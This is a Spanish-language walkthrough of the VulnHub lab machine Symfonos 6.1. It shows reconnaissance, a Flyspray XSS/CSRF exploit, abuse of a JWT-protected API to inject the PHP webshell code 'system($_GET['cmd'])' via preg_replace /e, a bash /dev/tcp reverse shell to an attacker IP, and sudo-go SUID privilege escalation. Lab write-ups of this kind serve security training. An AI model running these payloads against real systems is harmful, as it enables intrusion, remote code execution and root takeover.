-----
- Tags: #xss #csrf #apis #go
------
# Explicación e instalación

> En este tercer escenario vamos a estar realizando la máquina **Symfonos 6.1**, para descargarla nos vamos a dirigir al siguiente [link](https://www.vulnhub.com/entry/symfonos-61,458/). Una vez exportado el archivo .OVA vamos a cambiarle la configuración a **Bridged** y **Replicate Network State**.

-----
# Resolución

## Reconocimiento

### NMAP

```js
# Nmap 7.94SVN scan initiated Mon Oct 28 16:51:12 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oN allPorts 192.168.0.81
Nmap scan report for 192.168.0.81
Host is up, received arp-response (0.0021s latency).
Scanned at 2024-10-28 16:51:12 -03 for 5s
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3000/tcp open  ppp     syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: 00:0C:29:D9:9B:BE (VMware)

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Oct 28 16:51:17 2024 -- 1 IP address (1 host up) scanned in 5.37 seconds
```
### Información obtenida

```
-----------------------
Puerto 80:

PHP version:
PHP/5.6.40 (whatweb)

Directory's (gobuster dictionary medium & big)
/posts/ (Un pequeño texto en donde se describe quien fue achilles)
/posts/css/
/posts/includes/ (dos archivos .php interpretados que no se les ve el contenido)
/flyspray

flyspray:
Flyspray es OPEN SOURCE, por lo tanto revisamos su estructura en github y encontramos una seccion que nos indica que poseemos la version 1.0

-----------------------
Puerto 3000:
Una web de tipo repositorios (Github) en la que encontramos dos usuarios.

-----------------------
Puerto 5000:

404 Not Found (Parece ser que es una API que corre por detrás)

```
## Explotación

### XSS and CSRF

Utilizamos ``searchsploit`` para emplear el recurso ``php/webapps/41918.txt`` y generar un **CSRF** derivado de un **XSS** en el directorio ``192.168.0.81/flyspray``
Adquirimos el usuario ``hacker:12345678`` con privilegios de administrador gracias al script previo, de esta manera ganamos visibilidad de un reporte en el que encontramos credenciales de ``achilles``
``achilles:h2sBr9gryBunKdF9`` (Estas credenciales son válidas en el blog localizado en el **puerto 3000**) 

### Abuso de API

Una vez consigamos las credenciales de ``achilles`` para la web situada en el **puerto 3000** ingresamos a su cuenta. Una vez dentro vemos que en su perfil se encuentran dos repositorios en los cuales el usuario muestra el la composición del código de su blog situado en ``http://192.168.0.81/posts`` y además muestra la composición de una **API** que corre por detrás.

Indagando el código de su blog, se encuentra un archivo llamado ``index.php``, en este se utiliza una función con un **parámetro vulnerable** ya que el mismo se encuentra desactualizado, esta función es la siguiente ``preg_replace('/.*/e',$content, "Win");`` el parámetro vulnerable es ``/e``.

La función `preg_replace` en PHP se utiliza para realizar una búsqueda y reemplazo en cadenas usando expresiones regulares.

- El modificador `/e` **ejecuta cualquier código PHP que coincida con el patrón**, permitiendo la ejecución de código arbitrario. Esto abre la puerta a un ataque de inyección de código si `$content` proviene de una fuente insegura. Un atacante podría manipular `$content` para insertar código PHP malicioso que se ejecutaría cuando se evalúe.

-------------

Si indagamos en el contenido del repositorio correspondiente a la API veremos que hay variedades de directorios con código explicando su funcionamiento y sus diferentes llamadas. Analizando en profundidad descubrimos que hay una ruta llamada ``/ls2o4g/v1.0/auth/login`` ubicada en el **puerto 5000**. Esta ruta por defecto nos brinda un ``404 Not Found``, pero observando el código de desarrollo vemos que esta petición tiene que ser tramitada por **POST** y en formato **JSON**, además de proporcionar los campos ``username`` y ``password``, esto lo podemos hacer mediante **Burpsuite** o con ``curl``.
Cabe destacar que en los campos username y password probamos las diferentes credenciales obtenidas a lo largo del reconocimiento y explotación, por lo tanto encontramos que el usuario válido es ``achilles``

- ``curl -s -X POST "http://192.168.0.81:5000/ls2o4g/v1.0/auth/login" -H "Content-Type: application/json" -d '{"username":"achilles", "password":"h2sBr9gryBunKdF9"}'``

Esto nos brinda un **JWT** que nos servirá para **validar** la autenticación.

Luego de todo lo anterior encontramos una sección en la que se nos indica que podemos **leer**, **actualizar**, **eliminar**, etc recursos del ``/posts/`` a través de la API.

![[Imagenes de todas las carpetas/Máquina vulnerable 3/MV 1.png]]

En nuestro caso nos interesa el ultimo método llamado ``PATCH`` que como vemos nos pide que se identifique el ID del usuario actual luego de utilizar dicho método. 
Indagando más en los diferentes archivos con código de composición de la API vemos que hay uno llamado ``posts.ctrl.go`` que muestra que los diferentes métodos requieren en formato **JSON** un parámetro ``text``.

![[Imagenes de todas las carpetas/Máquina vulnerable 3/MV 2.png]]

Por lo tanto siguiendo todo lo que conseguimos hasta ahora podemos enviar una petición con ``curl`` a través del método ``PATCH``, arrastrando el Token obtenido con el ``curl`` previo, esto quedaría de la siguiente forma.

- ``curl -s -X PATCH "192.168.0.81:5000/ls2o4g/v1.0/posts/1" -H "Content-Type: application/json" -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzA4NDMxMzIsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ._TJYfmY132NRHWRn6FGo-Vhu00yNSTV4PmGGYJPWNhY" -d '{"text": "Probando"}'``

Como se puede ver en el comando anterior, vemos que se emplea la ruta ``192.168.0.81:5000/ls2o4g/v1.0/posts/1`` y que en esta el número ``1`` hace referencia al identificador de usuario de ``achilles``. Luego se proporciona el **Token** y por ultimo la data tramitada en formato **JSON** siguiendo los parámetros que vimos previamente, en este caso colocando la cadena "*Probando*", si ahora vamos a la web ``http://192.168.0.81/posts/`` veremos que ya no aparece la descripción de ``Achilles``, si no que aparece nuestra cadena "*Probando*".

![[Imagenes de todas las carpetas/Máquina vulnerable 3/MV 3.png]]

Ahora como previamente vimos que en este Blog se empleaba un parámetro vulnerable en la función `preg_replace`, nos aprovecharemos de este para ver si nos interpreta código PHP dentro, por lo tanto en vez de la cadena "*Probando*" colocamos lo siguiente a través de ``curl``.

- ``curl -s -X PATCH "192.168.0.81:5000/ls2o4g/v1.0/posts/1" -H "Content-Type: application/json" -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzA4NDMxMzIsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ._TJYfmY132NRHWRn6FGo-Vhu00yNSTV4PmGGYJPWNhY" -d '{"text": "system($_GET['cmd'])"}'``

Ahora probamos si nos interpreta correctamente el código colocando el parámetro ``?cmd=id`` en la URL

![[Imagenes de todas las carpetas/Máquina vulnerable 3/MV 4.png]]

Solo quedaría ganar acceso con una **Reverse Shell** de esta forma.

- ``nc -nlvp 443`` En nuestra máquina de atacante.
- ``192.168.0.81/posts/?cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.0.194/443 0>%261'`` En la URL.

------
## Escalada de Privilegios

Una vez tenemos acceso a la máquina vamos a hacer un ``su achilles`` proporcionando la contraseña que encontramos previamente ``h2sBr9gryBunKdF9``

Detectamos con ``sudo -l`` que tenemos un privilegio a nivel de **sudoers** que nos permite ejecutar el binario ``/usr/local/go/bin/go`` como el usuario que queramos, por lo tanto buscamos por internet una forma de ejecutar un programa a través de ``go``.

En mi caso utilicé la siguiente [web](https://zetcode.com/golang/exec-command/) para guiarme.

En **GO** es ==necesario== que se especifique cada acción **entre doble comillas** separados por **comas**, por eso se emplea ``"chmod", "u+s", "/bin/bash"``

```
package main

import (
    "log"
    "os/exec"
)

func main() {

    cmd := exec.Command("chmod", "u+s", "/bin/bash")

    err := cmd.Run()

    if err != nil {
        log.Fatal(err)
    }
}
```

De esta forma solo quedaría ejecutar con ``sudo``, es decir de forma privilegiada el binario ``go`` para que nos brinde privilegios **SUID** a la **bash**.

- ``sudo /usr/local/go/bin/go run privesc.go``

![[Imagenes de todas las carpetas/Máquina vulnerable 3/MV 5.png]]

![[Imagenes de todas las carpetas/Máquina vulnerable 3/MV 6.png]]